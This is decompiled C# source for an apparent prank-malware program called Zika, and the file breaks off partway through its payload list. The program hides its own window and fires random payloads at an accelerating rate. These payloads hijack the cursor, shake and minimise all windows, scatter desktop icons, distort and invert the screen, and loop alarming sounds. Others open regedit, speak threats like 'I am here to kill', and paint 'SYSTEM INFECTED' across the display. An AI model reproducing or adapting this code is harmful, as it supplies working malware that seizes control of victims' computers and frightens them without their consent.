using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Zika.Properties;

namespace Zika;

public class Form1 : Form
{
	public delegate bool EnumedWindow(IntPtr handleWindow, ArrayList handles);

	internal struct RECT
	{
		public int left;

		public int top;

		public int right;

		public int bottom;
	}

	public enum SpecialWindowHandles
	{
		HWND_TOP = 0,
		HWND_BOTTOM = 1,
		HWND_TOPMOST = -1,
		HWND_NOTOPMOST = -2
	}

	[Flags]
	public enum SetWindowPosFlags : uint
	{
		SWP_ASYNCWINDOWPOS = 0x4000u,
		SWP_DEFERERASE = 0x2000u,
		SWP_DRAWFRAME = 0x20u,
		SWP_FRAMECHANGED = 0x20u,
		SWP_HIDEWINDOW = 0x80u,
		SWP_NOACTIVATE = 0x10u,
		SWP_NOCOPYBITS = 0x100u,
		SWP_NOMOVE = 2u,
		SWP_NOOWNERZORDER = 0x200u,
		SWP_NOREDRAW = 8u,
		SWP_NOREPOSITION = 0x200u,
		SWP_NOSENDCHANGING = 0x400u,
		SWP_NOSIZE = 1u,
		SWP_NOZORDER = 4u,
		SWP_SHOWWINDOW = 0x40u
	}

	[StructLayout(LayoutKind.Sequential)]
	public class MENUITEMINFO
	{
		public int cbSize;

		public uint fMask;

		public uint fType;

		public uint fState;

		public uint wID;

		public IntPtr hSubMenu;

		public IntPtr hbmpChecked;

		public IntPtr hbmpUnchecked;

		public IntPtr dwItemData;

		public IntPtr dwTypeData;

		public uint cch;

		public IntPtr hbmpItem;

		public MENUITEMINFO()
		{
			cbSize = Marshal.SizeOf(typeof(MENUITEMINFO));
		}
	}

	public static bool f6open = false;

	private bool allowshowdisplay;

	private bool mouseEff1;

	private bool mouseEff2;

	private bool mouseEff3;

	private bool windowEff1;

	private bool windowEff2;

	private bool windowEff3;

	private bool wtfEff1;

	private bool wtfEff2;

	private bool wtfEff3;

	private bool wtfEff4;

	private bool wtfEff5;

	private static bool windowEff4 = false;

	private bool audio4;

	private Random r = new Random();

	private double a1;

	private double a2;

	private double s1;

	private double s2;

	private double xx;

	private int h1;

	private int w1;

	private int x1 = -1;

	private int y1;

	private int t;

	private int m1;

	private int m2;

	private int m3;

	private int we1;

	private int w2;

	private int w3;

	private int w4;

	private int w0;

	private int x0;

	private int x2;

	private int x3;

	private int x4;

	private int x5;

	private static List<IntPtr> blacklist = new List<IntPtr>();

	private bool direct;

	private int t4;

	private const int SW_SHOWNORMAL = 1;

	private const int SW_SHOWMINIMIZED = 2;

	private const int SW_SHOWMAXIMIZED = 3;

	private string[] specs = new string[40]
	{
		"{BACKSPACE}", "{BREAK}", "{CAPSLOCK}", "{DELETE}", "{DOWN}", "{END}", "{ENTER}", "{ESC}", "{HELP}", "{HOME}",
		"{INSERT}", "{LEFT}", "{NUMLOCK}", "{PGDN}", "{PGUP}", "{PRTSC}", "{RIGHT}", "{SCROLLLOCK}", "{TAB}", "{UP}",
		"{F1}", "{F2}", "{F3}", "{F4}", "{F5}", "{F6}", "{F7}", "{F8}", "{F9}", "{F10}",
		"{F11}", "{F12}", "{F13}", "{F14}", "{F15}", "{F16}", "{ADD}", "{SUBTRACT}", "{MULTIPLY}", "{DIVIDE}"
	};

	private string specc = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

	private const int MIIM_STRING = 64;

	private const int MFT_STRING = 0;

	private const uint WM_SETTEXT = 12u;

	private const int WM_ERASEBKGND = 20;

	private IContainer components;

	private Button button1;

	private Timer timer1;

	private Button button2;

	private Button button3;

	private Button button4;

	private Button button5;

	private Button button6;

	private Button button7;

	private Button button8;

	private Button button9;

	private Button button10;

	private Button button11;

	private Button button12;

	private Button button13;

	private Button button14;

	private Button button15;

	private Timer timer2;

	private Timer timer3;

	public Form1()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		mouseEff1 = !mouseEff1;
	}

	[DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
	internal static extern bool GetWindowRect(IntPtr hWnd, ref RECT rect);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

	protected override void SetVisibleCore(bool value)
	{
		((Form)this).SetVisibleCore(allowshowdisplay ? value : allowshowdisplay);
	}

	[DllImport("user32")]
	private static extern int PostMessage(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32")]
	private static extern IntPtr FindWindow(string className, string caption);

	[DllImport("user32")]
	private static extern IntPtr FindWindowEx(IntPtr parent, IntPtr startChild, string className, string caption);

	private static ArrayList GetAllChildrenWindowHandles(IntPtr hParent, int maxCount)
	{
		ArrayList arrayList = new ArrayList();
		int i = 0;
		IntPtr startChild = IntPtr.Zero;
		IntPtr zero = IntPtr.Zero;
		for (; i < maxCount; i++)
		{
			zero = FindWindowEx(hParent, startChild, null, null);
			if (zero == IntPtr.Zero)
			{
				break;
			}
			arrayList.Add(zero);
			arrayList.AddRange(GetAllChildrenWindowHandles(zero, maxCount));
			startChild = zero;
		}
		return arrayList;
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, SetWindowPosFlags uFlags);

	private void timer1_Tick(object sender, EventArgs e)
	{
		//IL_0315: Unknown result type (might be due to invalid IL or missing references)
		//IL_031c: Expected O, but got Unknown
		//IL_09eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f2: Expected O, but got Unknown
		//IL_10f8: Unknown result type (might be due to invalid IL or missing references)
		if (h1 == 0)
		{
			h1 = Screen.get_PrimaryScreen().get_Bounds().Height;
			w1 = Screen.get_PrimaryScreen().get_Bounds().Width;
		}
		t++;
		if (mouseEff1)
		{
			Point position = Cursor.get_Position();
			position.Offset((int)(Math.Sin(a1) * 5.0), (int)(Math.Cos(a1) * 5.0));
			Cursor.set_Position(position);
			a1 += 0.01;
			if (m1++ == 200)
			{
				m1 = 0;
				mouseEff1 = false;
			}
		}
		if (mouseEff2)
		{
			if (x1 < 0)
			{
				x1 = Cursor.get_Position().X;
				y1 = Cursor.get_Position().Y;
				h1 = Screen.get_PrimaryScreen().get_Bounds().Height;
				w1 = Screen.get_PrimaryScreen().get_Bounds().Width;
			}
			Cursor.set_Position(new Point((x1 + (int)s2) % w1, (y1 + (int)s1) % h1));
			x1 = Cursor.get_Position().X;
			y1 = Cursor.get_Position().Y;
			if (s1 == 0.0)
			{
				s1 = -10.0;
				s2 = r.NextDouble() * 60.0 - 30.0;
			}
			else if (s1 < 0.0 && s1 > -0.1)
			{
				s1 = 0.05;
			}
			else if (s1 <= 0.0)
			{
				s1 /= 1.08;
			}
			else if (s1 >= 0.0)
			{
				s1 *= 1.08;
			}
			if (m2++ == 500)
			{
				m2 = 0;
				mouseEff2 = false;
			}
		}
		if (mouseEff3)
		{
			Point position2 = Cursor.get_Position();
			position2.Offset(r.Next(-10, 11), r.Next(-10, 11));
			Cursor.set_Position(position2);
			if (m3++ == 500)
			{
				m3 = 0;
				mouseEff3 = false;
			}
		}
		if (wtfEff1)
		{
			IntPtr dC = GetDC(IntPtr.Zero);
			Graphics val = Graphics.FromHdc(dC);
			try
			{
				val.set_SmoothingMode((SmoothingMode)1);
				Bitmap val2 = new Bitmap(w1, h1);
				Graphics obj = Graphics.FromImage((Image)(object)val2);
				obj.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(w1, h1));
				obj.Dispose();
				float num = (float)(Math.Sin(a1) * 1.5 + 0.5);
				val.ScaleTransform(num, num);
				val.RotateTransform((float)a2);
				val.DrawImage((Image)(object)val2, new Rectangle(0, 0, ((Image)val2).get_Width(), ((Image)val2).get_Height()), 0, 0, ((Image)val2).get_Width(), ((Image)val2).get_Height(), (GraphicsUnit)2);
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			ReleaseDC(IntPtr.Zero, dC);
			a1 += 2.0;
			a2 += 3.0;
			if (x0++ == 200)
			{
				x0 = 0;
				wtfEff1 = false;
			}
		}
		if (wtfEff2)
		{
			try
			{
				Desktop.SaveDesktop();
				int num2 = Desktop.m_OriginalPoint.Length;
				IntPtr sysLVHwnd = Desktop.GetSysLVHwnd();
				int x = Cursor.get_Position().X;
				int y = Cursor.get_Position().Y;
				int num3 = Desktop.SendMessageA(sysLVHwnd, 4151, 0, 0);
				num3 &= -524289;
				Desktop.SendMessageA(sysLVHwnd, 4150, 0, num3);
				for (int i = 0; i < num2; i++)
				{
					int num4 = Desktop.m_OriginalPoint[i].right - Desktop.m_OriginalPoint[i].left;
					int num5 = Desktop.m_OriginalPoint[i].bottom - Desktop.m_OriginalPoint[i].top;
					if (i == 0)
					{
						if (x >= Desktop.m_OriginalPoint[i].left - 15 && x <= Desktop.m_OriginalPoint[i].right + 15 && y >= Desktop.m_OriginalPoint[i].top - 15 && y <= Desktop.m_OriginalPoint[i].bottom + 15)
						{
							int num6 = (num4 + num5) / 2;
							double num7 = Math.Atan2(y - (Desktop.m_OriginalPoint[i].top + num5 / 2), x - (Desktop.m_OriginalPoint[i].left + num4 / 2));
							int num8 = (int)((double)Desktop.m_OriginalPoint[i].left - Math.Sin(num7) * (double)num6);
							int num9 = (int)((double)Desktop.m_OriginalPoint[i].top - Math.Cos(num7) * (double)num6);
							if (num8 < 0)
							{
								num8 = 0;
							}
							if (num9 < 0)
							{
								num9 = 0;
							}
							if (num8 > w1 - num4)
							{
								num8 = w1 - num4;
							}
							if (num9 > h1 - num5)
							{
								num9 = h1 - num5;
							}
							Desktop.SendMessageA_1(sysLVHwnd, 4111, i, MakeLParam(num8, num9));
						}
					}
					else if (x >= Desktop.m_OriginalPos[i].x - 15 && x <= Desktop.m_OriginalPos[i].x + num4 + 15 && y >= Desktop.m_OriginalPos[i].y - 15 && y <= Desktop.m_OriginalPos[i].y + num5 + 15)
					{
						int num10 = (num4 + num5) / 2;
						double num11 = Math.Atan2(y - (Desktop.m_OriginalPos[i].y + num5 / 2), x - (Desktop.m_OriginalPos[i].x + num4 / 2));
						int num12 = (int)((double)Desktop.m_OriginalPoint[i].left - Math.Sin(num11) * (double)num10);
						int num13 = (int)((double)Desktop.m_OriginalPoint[i].top - Math.Cos(num11) * (double)num10);
						if (num12 < 0)
						{
							num12 = -num12;
						}
						if (num13 < 0)
						{
							num13 = -num13;
						}
						if (num12 > w1 - num4)
						{
							num12 = w1 - num4 - (num12 - (w1 - num4));
						}
						if (num13 > h1 - num5)
						{
							num13 = h1 - num5 - (num13 - (h1 - num5));
						}
						Desktop.SendMessageA_1(sysLVHwnd, 4111, i, MakeLParam(num12, num13));
					}
				}
			}
			catch (Exception)
			{
			}
			if (this.x2++ == 5000)
			{
				this.x2 = 0;
				wtfEff2 = false;
			}
		}
		if (wtfEff3)
		{
			try
			{
				xx += 0.09;
				Desktop.SaveDesktop();
				int num14 = Desktop.m_OriginalPoint.Length;
				IntPtr sysLVHwnd2 = Desktop.GetSysLVHwnd();
				_ = Cursor.get_Position().X;
				_ = Cursor.get_Position().Y;
				int num15 = Desktop.SendMessageA(sysLVHwnd2, 4151, 0, 0);
				num15 &= -524289;
				Desktop.SendMessageA(sysLVHwnd2, 4150, 0, num15);
				double num16 = 0.0;
				for (int j = 0; j < num14; j++)
				{
					num16 += 0.15;
					int num17 = Desktop.m_OriginalPoint[j].right - Desktop.m_OriginalPoint[j].left;
					int num18 = Desktop.m_OriginalPoint[j].bottom - Desktop.m_OriginalPoint[j].top;
					int wLow = (int)(Math.Sin(xx + num16) * (double)w1 / 4.0 + (double)(w1 / 2) - (double)(num17 / 2));
					int wHigh = (int)(Math.Cos(xx + num16) * (double)h1 / 4.0 + (double)(h1 / 2) - (double)(num18 / 2));
					Desktop.SendMessageA_1(sysLVHwnd2, 4111, j, MakeLParam(wLow, wHigh));
				}
			}
			catch (Exception)
			{
			}
			if (x3++ == 1000)
			{
				x3 = 0;
				wtfEff3 = false;
			}
		}
		if (wtfEff4)
		{
			Desktop.EnumWindows(delegate(IntPtr hwnd, IntPtr lParam)
			{
				foreach (IntPtr allChildrenWindowHandle in GetAllChildrenWindowHandles(hwnd, int.MaxValue))
				{
					try
					{
						RECT rect4 = default(RECT);
						GetWindowRect(allChildrenWindowHandle, ref rect4);
						MoveWindow(allChildrenWindowHandle, rect4.left + r.Next(-2, 3), rect4.top + r.Next(-2, 3), rect4.right - rect4.left + r.Next(-2, 3), rect4.bottom - rect4.top + r.Next(-2, 3), bRepaint: false);
						SetWindowPos(allChildrenWindowHandle, (IntPtr)0, rect4.left + r.Next(-2, 3), rect4.top + r.Next(-2, 3), rect4.right - rect4.left + r.Next(-2, 3), rect4.bottom - rect4.top + r.Next(-2, 3), SetWindowPosFlags.SWP_ASYNCWINDOWPOS | SetWindowPosFlags.SWP_NOACTIVATE | SetWindowPosFlags.SWP_NOOWNERZORDER);
					}
					catch (Exception)
					{
					}
				}
				try
				{
					RECT rect5 = default(RECT);
					GetWindowRect(hwnd, ref rect5);
					MoveWindow(hwnd, rect5.left + r.Next(-2, 3), rect5.top + r.Next(-2, 3), rect5.right - rect5.left + r.Next(-2, 3), rect5.bottom - rect5.top + r.Next(-2, 3), bRepaint: false);
					SetWindowPos(hwnd, (IntPtr)0, rect5.left + r.Next(-2, 3), rect5.top + r.Next(-2, 3), rect5.right - rect5.left + r.Next(-2, 3), rect5.bottom - rect5.top + r.Next(-2, 3), SetWindowPosFlags.SWP_ASYNCWINDOWPOS | SetWindowPosFlags.SWP_NOACTIVATE | SetWindowPosFlags.SWP_NOOWNERZORDER);
				}
				catch (Exception)
				{
				}
				return true;
			}, IntPtr.Zero);
			if (x4++ == 100)
			{
				x4 = 0;
				wtfEff4 = false;
			}
		}
		if (wtfEff5)
		{
			IntPtr dC2 = GetDC(IntPtr.Zero);
			Graphics val3 = Graphics.FromHdc(dC2);
			try
			{
				Bitmap val4 = new Bitmap(w1, h1);
				Graphics obj2 = Graphics.FromImage((Image)(object)val4);
				obj2.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(w1, h1));
				obj2.Dispose();
				val3.DrawImage((Image)(object)val4, new Rectangle(0, 0, ((Image)val4).get_Width(), ((Image)val4).get_Height() - 1), 0, 1, ((Image)val4).get_Width(), ((Image)val4).get_Height() - 1, (GraphicsUnit)2);
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
			ReleaseDC(IntPtr.Zero, dC2);
			if (x5++ == 200)
			{
				x5 = 0;
				wtfEff5 = false;
			}
		}
		if (windowEff1)
		{
			RECT rect = default(RECT);
			IntPtr foregroundWindow = GetForegroundWindow();
			GetWindowRect(foregroundWindow, ref rect);
			MoveWindow(foregroundWindow, rect.left, rect.top + (int)(Math.Sin(a2) * 6.0), rect.right - rect.left, rect.bottom - rect.top, bRepaint: true);
			a2 += 0.3;
			if (we1++ == 6000)
			{
				we1 = 0;
				windowEff1 = false;
			}
		}
		if (windowEff2)
		{
			RECT rect2 = default(RECT);
			IntPtr foregroundWindow2 = GetForegroundWindow();
			GetWindowRect(foregroundWindow2, ref rect2);
			MoveWindow(foregroundWindow2, rect2.left, rect2.top, rect2.right - rect2.left + r.Next(0, 2), rect2.bottom - rect2.top + r.Next(0, 2), bRepaint: true);
			if (w2++ == 4000)
			{
				w2 = 0;
				windowEff2 = false;
			}
		}
		if (windowEff4)
		{
			if (w0++ % 10 == 0)
			{
				ArrayList windows = GetWindows();
				if (h1 == 0)
				{
					h1 = Screen.get_PrimaryScreen().get_Bounds().Height;
					w1 = Screen.get_PrimaryScreen().get_Bounds().Width;
				}
				double angl = 0.0;
				double num19 = 6.283185307 / (double)windows.Count;
				int radius = Math.Min(w1, h1) / 2 - 220;
				int cx = w1 / 2;
				int cy = h1 / 2;
				foreach (IntPtr win in windows)
				{
					if (blacklist.Contains(win))
					{
						continue;
					}
					try
					{
						Thread thread = new Thread((ThreadStart)delegate
						{
							MoveWindow(win, (int)((double)cx - (double)radius * Math.Sin(angl + a2)), (int)((double)cy - (double)radius * Math.Cos(angl + a2)), 200, 200, bRepaint: true);
						});
						thread.Start();
						if (!thread.Join(100))
						{
							blacklist.Add(win);
							thread.Abort();
						}
					}
					catch (Exception)
					{
					}
					angl += num19;
				}
				a2 += 0.9;
			}
			if (w4++ == 300)
			{
				w4 = 0;
				windowEff4 = false;
			}
		}
		if (windowEff3)
		{
			RECT rect3 = default(RECT);
			IntPtr foregroundWindow3 = GetForegroundWindow();
			GetWindowRect(foregroundWindow3, ref rect3);
			int x2 = Cursor.get_Position().X;
			int y2 = Cursor.get_Position().Y;
			if (h1 == 0)
			{
				h1 = Screen.get_PrimaryScreen().get_Bounds().Height;
				w1 = Screen.get_PrimaryScreen().get_Bounds().Width;
			}
			if (x2 >= rect3.left && x2 < rect3.right && y2 >= rect3.top && y2 < rect3.bottom)
			{
				bool flag = false;
				GetWindowRect(foregroundWindow3, ref rect3);
				if (rect3.left < 201)
				{
					MoveWindow(foregroundWindow3, 420, rect3.top, 200, 200, bRepaint: true);
					flag = true;
				}
				GetWindowRect(foregroundWindow3, ref rect3);
				if (rect3.top < 201)
				{
					MoveWindow(foregroundWindow3, rect3.left, 420, 200, 200, bRepaint: true);
					flag = true;
				}
				GetWindowRect(foregroundWindow3, ref rect3);
				if (rect3.right > w1 - 201)
				{
					MoveWindow(foregroundWindow3, w1 - 420, rect3.top, 200, 200, bRepaint: true);
					flag = true;
				}
				GetWindowRect(foregroundWindow3, ref rect3);
				if (rect3.bottom > h1 - 201)
				{
					MoveWindow(foregroundWindow3, rect3.left, h1 - 420, 200, 200, bRepaint: true);
					flag = true;
				}
				if (!flag)
				{
					if (y2 < (rect3.top + rect3.bottom) / 2 && x2 < (rect3.left + rect3.right) / 2 && x2 < w1 - 200 && y2 < h1 - 200)
					{
						MoveWindow(foregroundWindow3, x2 + 31, y2 + 31, 200, 200, bRepaint: true);
					}
					else if (y2 < (rect3.top + rect3.bottom) / 2 && x2 > 200 && y2 < h1 - 200)
					{
						MoveWindow(foregroundWindow3, x2 - 201, y2 + 31, 200, 200, bRepaint: true);
					}
					else if (x2 < (rect3.left + rect3.right) / 2 && x2 < w1 - 200 && y2 > 200)
					{
						MoveWindow(foregroundWindow3, x2 + 31, y2 - 201, 200, 200, bRepaint: true);
					}
					else if (x2 > 200 && y2 > 200)
					{
						MoveWindow(foregroundWindow3, x2 - 201, y2 - 201, 200, 200, bRepaint: true);
					}
				}
			}
			if (w3++ == 500)
			{
				w3 = 0;
				windowEff1 = false;
			}
		}
		if (audio4 && t4++ == 6000)
		{
			new SoundPlayer((Stream)Resources.NavaShield_Laugh_2).PlayLooping();
		}
	}

	private double square(double v)
	{
		return v * v;
	}

	internal void timertick()
	{
		timer1_Tick(null, new EventArgs());
	}

	internal void DirectMode()
	{
		direct = true;
	}

	[DllImport("user32.dll")]
	private static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

	private void button2_Click(object sender, EventArgs e)
	{
		mouseEff2 = !mouseEff2;
	}

	private void button3_Click(object sender, EventArgs e)
	{
		windowEff1 = !windowEff1;
	}

	private void button4_Click(object sender, EventArgs e)
	{
		windowEff2 = !windowEff2;
	}

	public void PlayBeep(ushort frequency, int msDuration, ushort volume = 16383, bool loop = true, bool sine = true)
	{
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		int num = (int)(44100m * (decimal)msDuration / 1000m);
		int num2 = num * 2;
		int value = 36 + num2;
		binaryWriter.Write(1179011410);
		binaryWriter.Write(value);
		binaryWriter.Write(1163280727);
		binaryWriter.Write(544501094);
		binaryWriter.Write(16);
		binaryWriter.Write((short)1);
		binaryWriter.Write((short)1);
		binaryWriter.Write(44100);
		binaryWriter.Write(88200);
		binaryWriter.Write((short)2);
		binaryWriter.Write((short)16);
		binaryWriter.Write(1635017060);
		binaryWriter.Write(num2);
		double num3 = (double)(int)frequency * (Math.PI * 2.0) / 44100.0;
		double num4 = volume >> 2;
		for (int i = 0; i < num; i++)
		{
			short num5 = 0;
			num5 = ((!sine) ? ((short)(num4 * (double)Math.Sign(Math.Sin(num3 * (double)i)))) : ((short)(num4 * Math.Sin(num3 * (double)i))));
			binaryWriter.Write(num5);
		}
		memoryStream.Seek(0L, SeekOrigin.Begin);
		if (loop)
		{
			new SoundPlayer((Stream)memoryStream).PlayLooping();
		}
		else
		{
			new SoundPlayer((Stream)memoryStream).PlaySync();
		}
		binaryWriter.Close();
		memoryStream.Close();
	}

	public void PlayNoise(int msDuration, ushort volume = 16383, bool loop = true, bool sine = true)
	{
		//IL_0118: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		int num = (int)(44100m * (decimal)msDuration / 1000m);
		int num2 = num * 2;
		int value = 36 + num2;
		binaryWriter.Write(1179011410);
		binaryWriter.Write(value);
		binaryWriter.Write(1163280727);
		binaryWriter.Write(544501094);
		binaryWriter.Write(16);
		binaryWriter.Write((short)1);
		binaryWriter.Write((short)1);
		binaryWriter.Write(44100);
		binaryWriter.Write(88200);
		binaryWriter.Write((short)2);
		binaryWriter.Write((short)16);
		binaryWriter.Write(1635017060);
		binaryWriter.Write(num2);
		double num3 = volume >> 2;
		for (int i = 0; i < num; i++)
		{
			short num4 = 0;
			num4 = (short)(num3 * (-1.0 + 2.0 * r.NextDouble()));
			binaryWriter.Write(num4);
		}
		memoryStream.Seek(0L, SeekOrigin.Begin);
		if (loop)
		{
			new SoundPlayer((Stream)memoryStream).PlayLooping();
		}
		else
		{
			new SoundPlayer((Stream)memoryStream).PlaySync();
		}
		binaryWriter.Close();
		memoryStream.Close();
	}

	private void button5_Click(object sender, EventArgs e)
	{
		audio4 = false;
		PlayBeep(1000, 1000, 16383);
	}

	private void button6_Click(object sender, EventArgs e)
	{
		audio4 = false;
		new Thread((ThreadStart)delegate
		{
			for (int i = 0; i < 10; i++)
			{
				PlayBeep(175, 60, 16383, loop: false, sine: false);
				Thread.Sleep(180);
				PlayBeep(175, 60, 16383, loop: false, sine: false);
				Thread.Sleep(180);
				PlayBeep(175, 60, 16383, loop: false, sine: false);
				Thread.Sleep(260);
				PlayBeep(175, 60, 16383, loop: false, sine: false);
				Thread.Sleep(100);
				PlayBeep(175, 60, 16383, loop: false, sine: false);
				Thread.Sleep(100);
				PlayBeep(185, 60, 16383, loop: false, sine: false);
				Thread.Sleep(100);
				PlayBeep(175, 60, 16383, loop: false, sine: false);
				Thread.Sleep(180);
				PlayBeep(175, 60, 16383, loop: false, sine: false);
				Thread.Sleep(180);
				PlayBeep(175, 60, 16383, loop: false, sine: false);
				Thread.Sleep(100);
				PlayBeep(156, 60, 16383, loop: false, sine: false);
				Thread.Sleep(20);
				PlayBeep(131, 60, 16383, loop: false, sine: false);
				Thread.Sleep(20);
				PlayBeep(156, 60, 16383, loop: false, sine: false);
				Thread.Sleep(20);
				PlayBeep(131, 60, 16383, loop: false, sine: false);
				Thread.Sleep(20);
				PlayBeep(233, 60, 16383, loop: false, sine: false);
				Thread.Sleep(20);
				PlayBeep(208, 60, 16383, loop: false, sine: false);
				Thread.Sleep(20);
				PlayBeep(233, 60, 16383, loop: false, sine: false);
				Thread.Sleep(20);
				PlayBeep(208, 60, 16383, loop: false, sine: false);
				Thread.Sleep(20);
			}
		}).Start();
	}

	private void button7_Click(object sender, EventArgs e)
	{
		audio4 = false;
		PlayNoise(1000, 16383);
	}

	private void button8_Click(object sender, EventArgs e)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		if (!audio4)
		{
			t4 = 0;
			new SoundPlayer((Stream)Resources.NavaShield_Laugh_1).PlayLooping();
			audio4 = true;
		}
	}

	private void button9_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private void button10_Click(object sender, EventArgs e)
	{
		((Control)new Form3()).Show();
	}

	private void button11_Click(object sender, EventArgs e)
	{
		((Control)new Form4()).Show();
	}

	private void button12_Click(object sender, EventArgs e)
	{
	}

	private void button13_Click(object sender, EventArgs e)
	{
		windowEff3 = !windowEff3;
	}

	private void button14_Click(object sender, EventArgs e)
	{
		windowEff4 = true;
	}

	private void button15_Click(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		new SoundPlayer((Stream)Resources.pig).Play();
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		if (!f6open)
		{
			Application.DoEvents();
			int num = r.Next(0, 52);
			if (Program.debugmode)
			{
				Console.WriteLine("payload #" + num);
			}
			doPayload(num);
			timer2.set_Interval(Math.Max(200, timer2.get_Interval() - 1500));
			timer2.Stop();
			timer2.Start();
			Application.DoEvents();
		}
	}

	public void doPayload(int v)
	{
		//IL_0284: Unknown result type (might be due to invalid IL or missing references)
		//IL_028b: Expected O, but got Unknown
		//IL_0353: Unknown result type (might be due to invalid IL or missing references)
		//IL_038d: Expected O, but got Unknown
		//IL_04c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_04cd: Expected O, but got Unknown
		//IL_04ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f3: Expected O, but got Unknown
		//IL_0524: Unknown result type (might be due to invalid IL or missing references)
		//IL_052b: Expected O, but got Unknown
		//IL_05a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a9: Expected O, but got Unknown
		//IL_0664: Unknown result type (might be due to invalid IL or missing references)
		//IL_066b: Expected O, but got Unknown
		//IL_075c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0763: Expected O, but got Unknown
		//IL_0b10: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b17: Expected O, but got Unknown
		//IL_0e38: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			switch (v)
			{
			case 1:
				button1_Click(null, new EventArgs());
				break;
			case 2:
				button2_Click(null, new EventArgs());
				break;
			case 3:
				button3_Click(null, new EventArgs());
				break;
			case 4:
				button4_Click(null, new EventArgs());
				break;
			case 5:
				button5_Click(null, new EventArgs());
				break;
			case 6:
				button6_Click(null, new EventArgs());
				break;
			case 7:
				button7_Click(null, new EventArgs());
				break;
			case 8:
				button8_Click(null, new EventArgs());
				break;
			case 9:
				button9_Click(null, new EventArgs());
				break;
			case 10:
				button10_Click(null, new EventArgs());
				break;
			case 11:
				button11_Click(null, new EventArgs());
				break;
			case 12:
				button12_Click(null, new EventArgs());
				break;
			case 13:
				button13_Click(null, new EventArgs());
				break;
			case 14:
				button14_Click(null, new EventArgs());
				break;
			case 15:
				button15_Click(null, new EventArgs());
				break;
			case 16:
				Process.Start(new string[4] { "explorer", "notepad", "mspaint", "regedit" }.PickRandom());
				break;
			case 17:
			{
				List<string> list = new List<string>();
				foreach (Environment.SpecialFolder value in Enum.GetValues(typeof(Environment.SpecialFolder)))
				{
					list.Add(Environment.GetFolderPath(value));
				}
				Process.Start("explorer", list.PickRandom());
				break;
			}
			case 19:
			{
				SpeechSynthesizer val16 = new SpeechSynthesizer();
				try
				{
					val16.Speak(new string[7] { "Hello World", "fuck you, fuck you, fuck you fuck you fuck you", "I am a robot from outer space", "I am a robot from the future", "haahhahhahahahahahahhahaha", "I am here to kill", "Die Die Die Die Die Die" }.PickRandom());
					break;
				}
				finally
				{
					((IDisposable)val16)?.Dispose();
				}
			}
			case 20:
				try
				{
					Process.Start("mailto:" + new string[3] { "bub", "beb", "bride" }.PickRandom() + "@sexsex.");
					break;
				}
				catch (Exception)
				{
					break;
				}
			case 21:
			{
				IntPtr dC = GetDC(IntPtr.Zero);
				Graphics val15 = Graphics.FromHdc(dC);
				try
				{
					for (int num7 = 0; num7 < 50; num7++)
					{
						val15.DrawString("SYSTEM INFECTED", new Font(FontFamily.get_GenericMonospace(), 12f), Brushes.get_Red(), new PointF(r.Next(0, w1), r.Next(0, h1)));
					}
				}
				finally
				{
					((IDisposable)val15)?.Dispose();
				}
				ReleaseDC(IntPtr.Zero, dC);
				break;
			}
			case 22:
				f6open = true;
				((Control)new Form6()).Show();
				break;
			case 23:
			{
				foreach (IntPtr window in GetWindows())
				{
					try
					{
						ShowWindowAsync(window, 2);
					}
					catch (Exception)
					{
					}
				}
				break;
			}
			case 24:
			{
				foreach (IntPtr window2 in GetWindows())
				{
					try
					{
						ShowWindowAsync(window2, 3);
					}
					catch (Exception)
					{
					}
				}
				break;
			}
			case 25:
			{
				ColorMatrix colorMatrix = new ColorMatrix(new float[5][]
				{
					new float[5] { -1f, 0f, 0f, 0f, 0f },
					new float[5] { 0f, -1f, 0f, 0f, 0f },
					new float[5] { 0f, 0f, -1f, 0f, 0f },
					new float[5] { 0f, 0f, 0f, 1f, 0f },
					new float[5] { 1f, 1f, 1f, 0f, 1f }
				});
				IntPtr dC = GetDC(IntPtr.Zero);
				Graphics val12 = Graphics.FromHdc(dC);
				try
				{
					Bitmap val13 = new Bitmap(w1, h1);
					Graphics obj5 = Graphics.FromImage((Image)(object)val13);
					obj5.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(w1, h1));
					obj5.Dispose();
					ImageAttributes val14 = new ImageAttributes();
					val14.SetColorMatrix(colorMatrix);
